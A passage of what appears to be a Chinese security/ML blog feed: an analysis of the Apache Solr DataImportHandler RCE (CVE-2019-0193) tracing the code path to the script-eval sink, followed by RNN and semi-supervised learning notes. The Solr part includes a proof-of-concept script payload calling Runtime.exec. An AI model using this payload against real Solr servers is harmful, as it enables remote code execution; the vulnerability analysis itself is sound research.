class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><p>所有的url通过<code>org.apache.solr.servlet.SolrDispatchFilter</code>处理，在这个类里面调试<code>doFilter()</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest _request, ServletResponse _response, FilterChain chain, <span class="keyword">boolean</span> retry)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!(_request <span class="keyword">instanceof</span> HttpServletRequest)) <span class="keyword">return</span>;</span><br><span class="line">  HttpServletRequest request = closeShield((HttpServletRequest)_request, retry);</span><br><span class="line">  HttpServletResponse response = closeShield((HttpServletResponse)_response, retry);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (cores == <span class="keyword">null</span> || cores.isShutDown()) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">    <span class="comment">// No need to even create the HttpSolrCall object if this path is excluded.</span></span><br><span class="line">    <span class="keyword">if</span> (excludePatterns != <span class="keyword">null</span>) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">    AtomicReference&lt;HttpServletRequest&gt; wrappedRequest = <span class="keyword">new</span> AtomicReference&lt;&gt;();</span><br><span class="line">    <span class="comment">// the response and status code have already been sent</span></span><br><span class="line">    <span class="keyword">if</span> (!authenticateRequest(request, response, wrappedRequest)) &#123;<span class="keyword">return</span>;&#125;</span><br><span class="line">    <span class="keyword">if</span> (wrappedRequest.get() != <span class="keyword">null</span>) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line"> <span class="comment">// Authentication</span></span><br><span class="line">    <span class="keyword">if</span> (cores.getAuthenticationPlugin() != <span class="keyword">null</span>) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line"> <span class="comment">// Entry</span></span><br><span class="line">    HttpSolrCall call = getHttpSolrCall(request, response, retry);</span><br><span class="line">    ExecutorUtil.setServerThreadFlag(Boolean.TRUE);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      Action result = call.call();</span><br><span class="line">      <span class="keyword">switch</span> (result) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关键代码在17-20行，首先根据request找到<code>HttpSolrCall</code>对象，再调用<code>HttpSolrCal#call()</code>方法获取返回值。</p><p>那么跟到<code>org.apache.solr.servlet.HttpSolrCall#call()</code>看下…</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Action <span class="title">call</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  <span class="comment">/*...*/</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (cores == <span class="keyword">null</span>) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">  <span class="keyword">if</span> (solrDispatchFilter.abortErrorMessage != <span class="keyword">null</span>)&#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    init();</span><br><span class="line">    <span class="comment">/*...*/</span></span><br><span class="line">    HttpServletResponse resp = response;</span><br><span class="line">    <span class="keyword">switch</span> (action) &#123;</span><br><span class="line">      <span class="keyword">case</span> ADMIN:</span><br><span class="line">        handleAdminRequest();</span><br><span class="line">        <span class="keyword">return</span> RETURN;</span><br><span class="line">      <span class="keyword">case</span> REMOTEQUERY:</span><br><span class="line">        SolrRequestInfo.setRequestInfo(<span class="keyword">new</span> SolrRequestInfo(req, <span class="keyword">new</span> SolrQueryResponse()));</span><br><span class="line">        remoteQuery(coreUrl + path, resp);</span><br><span class="line">        <span class="keyword">return</span> RETURN;</span><br><span class="line">      <span class="keyword">case</span> PROCESS:</span><br><span class="line">        <span class="keyword">final</span> Method reqMethod = Method.getMethod(req.getMethod());</span><br><span class="line">        HttpCacheHeaderUtil.setCacheControlHeader(config, resp, reqMethod);</span><br><span class="line">        <span class="comment">// unless we have been explicitly told not to, do cache validation</span></span><br><span class="line">        <span class="comment">// if we fail cache validation, execute the query</span></span><br><span class="line">        <span class="keyword">if</span> (config.getHttpCachingConfig().isNever304() ||</span><br><span class="line">            !HttpCacheHeaderUtil.doCacheHeaderValidation(solrReq, req, reqMethod, resp)) &#123;</span><br><span class="line">          SolrQueryResponse solrRsp = <span class="keyword">new</span> SolrQueryResponse();</span><br><span class="line">          SolrRequestInfo.setRequestInfo(<span class="keyword">new</span> SolrRequestInfo(solrReq, solrRsp));</span><br><span class="line">          execute(solrRsp);</span><br><span class="line">          <span class="comment">/*...*/</span></span><br><span class="line">          writeResponse(solrRsp, responseWriter, reqMethod);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> RETURN;</span><br><span class="line">      <span class="keyword">default</span>: <span class="keyword">return</span> action;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line">    <span class="keyword">if</span> (shouldAudit(EventType.ERROR)) &#123;</span><br><span class="line">      cores.getAuditLoggerPlugin().doAudit(<span class="keyword">new</span> AuditEvent(EventType.ERROR, ex, req));</span><br><span class="line">    &#125;</span><br><span class="line">    sendError(ex);</span><br><span class="line">    <span class="comment">// walk the the entire cause chain to search for an Error</span></span><br><span class="line">    Throwable t = ex;</span><br><span class="line">    <span class="keyword">while</span> (t != <span class="keyword">null</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (t <span class="keyword">instanceof</span> Error) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><h3 id="找入口点"><a href="#找入口点" class="headerlink" title="找入口点"></a>找入口点</h3><p>实在看不下去了，根本不知道走哪个case，还是动态调试吧，之前已经用jwdp起了项目，现在把solr源码下下来，用IDEA起一个项目，然后加<code>dist</code>和<code>server/lib</code>目录到library里，用RemoteDebug下断点调试就行了。</p><p><img src="/vulnresearch-Solr_DataImportHandler_RCE/image-20191103160037181.png" alt="image-20191103160037181"></p><p>访问那个api后，调试发现走的是<code>PROCESS</code>的case：</p><p><img src="/vulnresearch-Solr_DataImportHandler_RCE/image-20191103161357607.png" alt="image-20191103161357607"></p><p>继续向下看到图中542行：<code>org.apache.solr.servlet.HttpSolrCall#execute()</code>，跟进去：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">execute</span><span class="params">(SolrQueryResponse rsp)</span> </span>&#123;</span><br><span class="line">  solrReq.getContext().put(<span class="string">"webapp"</span>, req.getContextPath());</span><br><span class="line">  solrReq.getCore().execute(handler, solrReq, rsp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取到SolrCore，执行其<code>org.apache.solr.core.SolrCore#execute()</code>方法，该方法会调用<code>handler.handleRequest(req,rsp)</code>对req做处理：</p><p><img src="/vulnresearch-Solr_DataImportHandler_RCE/image-20191103162039712.png" alt="image-20191103162039712"></p><p>在<code>handler.handleRequest(req,rsp)</code>中会调用<code>org.apache.solr.handler.RequestHandlerBase#handleRequestBody()</code>方法，如果是之前能静态分析到这里，可以像Chamd5的大佬一样，搜索该类的实现，发现<code>dataimport.DataImportHandler#handleRequestBody()</code>这个方法，但是现在既然已经动态调试了，那直接跟进去就行了。</p><p>至此，我们终于找到了处理该请求的入口。</p><h3 id="调用栈"><a href="#调用栈" class="headerlink" title="调用栈"></a>调用栈</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleRequestBody</span><span class="params">(SolrQueryRequest req, SolrQueryResponse rsp)</span></span></span><br><span class="line"><span class="function">          <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    rsp.setHttpCaching(<span class="keyword">false</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> figure out why just the first one is OK...</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">    SolrParams params = req.getParams();</span><br><span class="line">    NamedList defaultParams = (NamedList) initArgs.get(<span class="string">"defaults"</span>);</span><br><span class="line">    RequestInfo requestParams = <span class="keyword">new</span> RequestInfo(req, getParamsMap(params), contentStream);</span><br><span class="line">    String command = requestParams.getCommand();    </span><br><span class="line">    <span class="keyword">if</span> (DataImporter.SHOW_CONF_CMD.equals(command)) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (command != <span class="keyword">null</span> &amp;&amp; DataImporter.ABORT_CMD.equals(command)) &#123;</span><br><span class="line">      importer.runCmd(requestParams, <span class="keyword">null</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (importer.isBusy()) &#123;<span class="comment">/*...*/</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (command != <span class="keyword">null</span>) &#123;</span><br><span class="line">      <span class="comment">// RCE</span></span><br><span class="line">      <span class="keyword">if</span> (DataImporter.FULL_IMPORT_CMD.equals(command)</span><br><span class="line">              || DataImporter.DELTA_IMPORT_CMD.equals(command) ||</span><br><span class="line">              IMPORT_CMD.equals(command)) &#123;</span><br><span class="line">        importer.maybeReloadConfiguration(requestParams, defaultParams);</span><br><span class="line">        <span class="comment">// 获取一个SolrWriter</span></span><br><span class="line">        DIHWriter sw = getSolrWriter(processor, loader, requestParams, req);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (requestParams.isDebug()) &#123;</span><br><span class="line">          <span class="keyword">if</span> (debugEnabled) &#123;</span><br><span class="line">            <span class="comment">// Synchronous request for the debug mode</span></span><br><span class="line">            importer.runCmd(requestParams, sw);</span><br><span class="line">            <span class="comment">//...</span></span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="comment">// Asynchronous request for normal mode</span></span><br><span class="line">          <span class="keyword">if</span>(requestParams.getContentStream() == <span class="keyword">null</span> &amp;&amp; !requestParams.isSyncMode())&#123;</span><br><span class="line">            importer.runAsync(requestParams, sw);</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            importer.runCmd(requestParams, sw);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (DataImporter.RELOAD_CONF_CMD.equals(command)) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    rsp.add(<span class="string">"status"</span>, importer.isBusy() ? <span class="string">"busy"</span> : <span class="string">"idle"</span>);</span><br><span class="line">    rsp.add(<span class="string">"importResponse"</span>, message);</span><br><span class="line">    rsp.add(<span class="string">"statusMessages"</span>, importer.getStatusMessages());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先会提取出request的参数，然后关键在第18-39行，如果是调试模式(requestParams.isDebug())，则同步执行importer，如果不是则异步执行，为了方便调试，可以把payload加一个<code>debug=true</code>参数，调试同步的分支：</p><p><img src="/vulnresearch-Solr_DataImportHandler_RCE/image-20191103165424861.png" alt="image-20191103165424861"></p><p>继续向下跟，<code>DataImporter#runCmd()</code>调用<code>DataImporter#doFullImport()</code>——因为我们参数是<code>command=full-import</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFullImport</span><span class="params">(DIHWriter writer, RequestInfo requestParams)</span> </span>&#123;</span><br><span class="line">    log.info(<span class="string">"Starting Full Import"</span>);</span><br><span class="line">    setStatus(Status.RUNNING_FULL_DUMP);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      DIHProperties dihPropWriter = createPropertyWriter();</span><br><span class="line">      setIndexStartTime(dihPropWriter.getCurrentTimestamp());</span><br><span class="line">      docBuilder = <span class="keyword">new</span> DocBuilder(<span class="keyword">this</span>, writer, dihPropWriter, requestParams);</span><br><span class="line">      checkWritablePersistFile(writer, dihPropWriter);</span><br><span class="line">      docBuilder.execute();</span><br><span class="line">      <span class="keyword">if</span> (!requestParams.isDebug())</span><br><span class="line">        cumulativeStatistics.add(docBuilder.importStatistics);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到这里大概就可以猜到问题在第9行——<code>docBuilder.execute()</code>了，导入的dataConfig时我们可以控制的，而config中可以自写js脚本，又想到Nashorn解析的js脚本能执行java命令，这就导致了本次的漏洞。</p><p>跟完后续的调用栈吧，sink点在<code>ScriptTransformer#initEngine()</code>的87行——<code>ScriptEngine#eval(String)</code></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">org.apache.solr.handler.dataimport.DocBuilder#doFullDump</span><br><span class="line">  DocBuilder#buildDocument(VariableResolver, DocWrapper, Map&lt;String,Object&gt;, EntityProcessorWrapper, boolean, ContextImpl)</span><br><span class="line">    DocBuilder#buildDocument(VariableResolver, DocWrapper, Map&lt;String,Object&gt;, EntityProcessorWrapper, boolean, ContextImpl, List&lt;EntityProcessorWrapper&gt;):L476</span><br><span class="line">      EntityProcessorWrapper#nextRow:L280</span><br><span class="line">        EntityProcessorWrapper#loadTransformers // 主力里面的第100-111行，如果发现script标签，则向transformers加入解析js的transformer</span><br><span class="line">        EntityProcessorWrapper#applyTransformer:L222</span><br><span class="line">          ScriptTransformer#transformRow:L52</span><br><span class="line">           ScriptTransformer#initEngine:L87</span><br><span class="line">             ScriptEngine#eval(String) //这里的string就是之前script里的内容</span><br><span class="line">           javax.script.Invocable#invokeFunction//这里调用之前func定义的内容，产生RCE</span><br></pre></td></tr></table></figure><p>值得注意的是，我们可以直接在<code>ScriptEngine#eval(String)</code>处就直接RCE，即将script直接换成如下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="xml">&lt;![CDATA[java.lang.Runtime.getRuntime().exec("calc");]]&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>但是这样程序日志会有报错，因为invokeFunction找不到，综上本文还是选择了定义函数的payload。</p><h1 id="影响范围和修复"><a href="#影响范围和修复" class="headerlink" title="影响范围和修复"></a>影响范围和修复</h1><p>此漏洞影响solr&lt;=8.1.1，对比8.2.0可以看到修复方案：</p><p><img src="/vulnresearch-Solr_DataImportHandler_RCE/image-20191103202031725.png" alt="image-20191103202031725"></p><p>即dataConfig参数必须要dataConfigParam_enabled为True时才能使用，可以在配置或启动命令中设置<code>-Denable .dih.dataConfigParam=true</code></p><p><img src="/vulnresearch-Solr_DataImportHandler_RCE/image-20191103202135491.png" alt="image-20191103202135491"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>8月份的一个洞了，一直忙到现在才看，本身漏洞不复杂，但其中附加调试和找javaWeb入口点的技巧值得学习。</p><h1 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h1><ul><li><p>CVE-2019-0193 APACHE SOLR 远程命令执行漏洞分析， <a href="https://kylingit.com/blog/cve-2019-0193-apache-solr远程命令执行漏洞分析/" target="_blank" rel="noopener">https://kylingit.com/blog/cve-2019-0193-apache-solr%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a> </p></li><li><p>详细分析Solr的CVE-2019-0193以及velocity模板注入新洞， <a href="https://mp.weixin.qq.com/s/gl35WFkxhAbuw7BNQa1FiQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/gl35WFkxhAbuw7BNQa1FiQ</a></p></li><li>Apache Solr DataImportHandler 远程代码执行漏洞(CVE-2019-0193) 分析， <a href="https://paper.seebug.org/1009/" target="_blank" rel="noopener">https://paper.seebug.org/1009/</a> </li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Solr </tag>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RNN学习笔记</title>
      <link href="/ml-RNN%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/ml-RNN%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="RNN"><a href="#RNN" class="headerlink" title="RNN"></a>RNN</h1><p>普通神经网络不能考虑之前一个单词对下一个单词的作用，即上下文，因此引入RNN。</p><p>RNN在中间层加入了memory，在每次传播后，将中间层输出存储到memory，在下一次传播时，将结果取出与原输入一起作为输入，之后再传出到下一层。</p><p>以下图为例，为了方便演示，将激活函数全部变为线性，并且权重设为1，假设一开始，输入矩阵$[1,1]^T$，那么会输出$[4,4]^T$，同时两个记忆体由0变为2（因为隐藏层的输出是2）</p><a id="more"></a><p><img src="/ml-RNN学习笔记/image-20191024154745435.png" alt="image-20191024154745435"></p><p>那么接下来，输入矩阵$[1,1]^T$，这次虽然输入是一样的，但是由于memory不同，而memory也是输入的一部分，因此隐藏层输出为$[6,6]^T$，最终出$[12,12]^T$</p><p><img src="/ml-RNN学习笔记/image-20191024155107906.png" alt="image-20191024155107906"></p><p>因此输入个向量序列后，大致会执行类似下图流程</p><p><img src="/ml-RNN学习笔记/image-20191024155320413.png" alt="image-20191024155320413"></p><p>可以将其变形为深度学习模型，即存在多个隐藏层</p><p>同时，其有如下变形</p><ul><li><p>Elman Network: memory存中间值</p></li><li><p>Jordan Network: memory存output值</p><p><img src="/ml-RNN学习笔记/image-20191024155515493.png" alt="image-20191024155515493"></p></li></ul><h1 id="Bidirectional-RNN"><a href="#Bidirectional-RNN" class="headerlink" title="Bidirectional RNN"></a>Bidirectional RNN</h1><p>同时train正向和反向的神经网络，结合两个网络的output结合得到最终output：</p><p><img src="/ml-RNN学习笔记/image-20191024155601826.png" alt="image-20191024155601826"></p><h1 id="Long-Short-term-Memory-LSTM"><a href="#Long-Short-term-Memory-LSTM" class="headerlink" title="Long Short-term Memory(LSTM)"></a>Long Short-term Memory(LSTM)</h1><p>如下图所示，对于记忆体增加三个闸门：</p><ul><li><p>Input Gate：控制其他神经元能否写入记忆体</p></li><li><p>Output Gate：控制其他神经元能否读取记忆体</p></li><li><p>Forget Gate：控制记忆体是否该格式化数据</p><p>因此该神经网络有四个输入，一个输出，是否开放Gate由网络学习得到</p></li></ul><p><img src="/ml-RNN学习笔记/image-20191024155929389.png" alt="image-20191024155929389"></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>Machine Learning (Hung-yi Lee, NTU) ， <a href="https://www.youtube.com/watch?v=CXgbekl66jc&amp;list=PLJV_el3uVTsPy9oCRY30oBPNLCo89yu49" target="_blank" rel="noopener">https://www.youtube.com/watch?v=CXgbekl66jc&amp;list=PLJV_el3uVTsPy9oCRY30oBPNLCo89yu49</a> （图片来源，李老师讲的课真的很好，大家可以听听看）</p>]]></content>
      
      
      <categories>
          
          <category> 机器学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
            <tag> 半监督 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>半监督机器学习模型学习笔记</title>
      <link href="/ml-%E5%8D%8A%E7%9B%91%E7%9D%A3%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/ml-%E5%8D%8A%E7%9B%91%E7%9D%A3%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h1><p>半监督（Semi-supervised Learning）即输入小部分已标记数据和大部分未标记数据进行学习，以提升准确率的一类机器学习方法。</p><p>有两种用法：</p><ul><li>Transductive learning：无标记数据就是测试集本身</li><li>Inductive learning：无标记数据不是测试集 </li></ul><a id="more"></a><p>之所以有效果的原因：未标记的数据的特征是有价值的，例如下图，未标记的样本分布决定SVM的超平面怎么划：</p><p><img src="/ml-半监督机器学习学习笔记/1571834496021.png" alt="1571834496021"></p><p>但是这也不绝对，因为如果左下的数据点时狗的话那么平面就不是这样了，因此半监督不一定效果好，其关键在于假设是否符合实际。</p><h1 id="Semi-supervised-Generative-Model-生成式方法"><a href="#Semi-supervised-Generative-Model-生成式方法" class="headerlink" title="Semi-supervised Generative Model(生成式方法)"></a>Semi-supervised Generative Model(生成式方法)</h1><p>先给出初始值，接着计算无标记数据的$p\theta(C_1|x^u)$，再更新模型的$P(C_1)$和$\mu$，反复迭代直到算法收敛</p><p><img src="/ml-半监督机器学习学习笔记/image-20191024110951281.png" alt="image-20191024110951281"></p><h1 id="Self-training"><a href="#Self-training" class="headerlink" title="Self-training"></a>Self-training</h1><ol><li>用标记数据生成模型</li><li>用模型预测未标记数据</li><li>将部分预测的标记数据从未标记数据中移到已标记数据中，再回到第一步，这里移动的策略需要自己决定</li></ol><p><img src="/ml-半监督机器学习学习笔记/image-20191024111124407.png" alt="image-20191024111124407"></p><h1 id="Generative-Model-amp-Self-training"><a href="#Generative-Model-amp-Self-training" class="headerlink" title="Generative Model &amp; Self-training"></a>Generative Model &amp; Self-training</h1><p>Generative Model对未标记数据属于哪一类不是确定的，而是一个可能性，而Self-training对与未标记数据会给出属于哪一类，非黑即白。</p><p>对于神经网络来说，Generative Model不适用</p><p>对于直推学习来说，Self-trainging不适用（因为未标记的数据本身就是需要预测的，第一次已经能给出结果）</p><h1 id="Entropy-based-Regularization"><a href="#Entropy-based-Regularization" class="headerlink" title="Entropy-based Regularization"></a>Entropy-based Regularization</h1><p>Self-training的优化版，使其适用于神经网络，其思想是认为，如果$y^u$的分布较为集中，那么分类效果比较好，而若$y^u$分布不集中，则神经网络效果较差，因此再损失函数总增加E的度量，E为Entropy，表示了分布是否集中 </p><p><img src="/ml-半监督机器学习学习笔记/1571835087936.png" alt="1571835087936"></p><h1 id="Semi-supervised-SVM"><a href="#Semi-supervised-SVM" class="headerlink" title="Semi-supervised SVM"></a>Semi-supervised SVM</h1><p>枚举未标记的所有可能性，最大化margin和least error</p><p><img src="/ml-半监督机器学习学习笔记/image-20191024121420642.png" alt="image-20191024121420642"></p><h1 id="Smoothness-Assumption"><a href="#Smoothness-Assumption" class="headerlink" title="Smoothness Assumption"></a>Smoothness Assumption</h1><p>假设：如果$x_1$和$x_2$相似，那么$y_1$可能等于$y_2$，更准确的说，$x_1$和$x_2$在同一高密度的区域的区域上，那么它们可能一致（感觉很像基于密度的聚类算法）</p><p>又由于未标记样本的特征可以填充密度，理论上是有效的。</p><p>因此具体做法：先聚类，然后再Label</p><h2 id="Graph-based-Approach"><a href="#Graph-based-Approach" class="headerlink" title="Graph-based Approach"></a>Graph-based Approach</h2><p>将$x$视为点，在点之间连边，构成图，如果两点之间可达，那么认为两条数据是相似的。如下如，方块和三角虽然距离很近，但是由于它们不可达，因此它们不相似</p><p><img src="/ml-半监督机器学习学习笔记/1571836705037.png" alt="1571836705037"></p><p>有些时候，这些边是现成就有的，比如说论文之间的互相引用，网页间的超链接。</p><p>有些情况下是没有的，只能通过一些经验来构造边，比如使用k近邻，e-近邻（推荐），如下图所示，距离推荐使用Gaussian Radial Basis，只有靠近的点才会符合要求</p><p><img src="/ml-半监督机器学习学习笔记/1571837008739.png" alt="1571837008739"></p><p>该方法的优势在于赋予了标记数据“传染性”，其可以延边传播到所有类成员。劣势在于未标记数据要足够多，否则无法传递。</p><p>定量分析smoothness：</p><p><img src="/ml-半监督机器学习学习笔记/image-20191024115845979.png" alt="image-20191024115845979"></p><p>另外$S$可以通过矩阵运算得到，即计算L, W为图的邻接矩阵，D的对角线上的值为每行的和</p><p><img src="/ml-半监督机器学习学习笔记/image-20191024120650988.png" alt="image-20191024120650988"></p><p>在神经网络传播时，将S乘上权重$\lambda$加到损失函数上：</p><p><img src="/ml-半监督机器学习学习笔记/image-20191024121139659.png" alt="image-20191024121139659"></p><h1 id="Disagreement-based-method（基于分歧的方法）"><a href="#Disagreement-based-method（基于分歧的方法）" class="headerlink" title="Disagreement-based method（基于分歧的方法）"></a>Disagreement-based method（基于分歧的方法）</h1><p>首先提出多视图的概念，即一个数据对象在多个方面存在多个数据集，比如电影，就存在图像画面的数据集和声音的数据集（两个视图），因此对于多个方面（视图）建立多个模型。</p><p>多个模型间可以展开协同训练，即先在每个视图上，使用已标记的数据训练出分类器，让每一个分类器标记未标记的数据，选择最有把握的未标记样本赋予伪标记放入训练集，再将新的训练集给另一视图上的分类器训练，直到分类器结果不再变化。</p><p>该方法经过改造，可以用于单视图，仅需不同分类器就可提升效果。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><p>Machine Learning (Hung-yi Lee, NTU) ， <a href="https://www.youtube.com/watch?v=CXgbekl66jc&amp;list=PLJV_el3uVTsPy9oCRY30oBPNLCo89yu49" target="_blank" rel="noopener">https://www.youtube.com/watch?v=CXgbekl66jc&amp;list=PLJV_el3uVTsPy9oCRY30oBPNLCo89yu49</a> （图片来源，李老师讲的课真的很好，大家可以听听看）</p></li><li><p>周志华. 机器学习[M]. 清华大学出版社, 2016. </p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 机器学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
            <tag> 半监督 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fortify使用初探</title>
      <link href="/whitebox-Fortify%E4%BD%BF%E7%94%A8%E5%88%9D%E6%8E%A2/"/>
      <url>/whitebox-Fortify%E4%BD%BF%E7%94%A8%E5%88%9D%E6%8E%A2/</url>
      
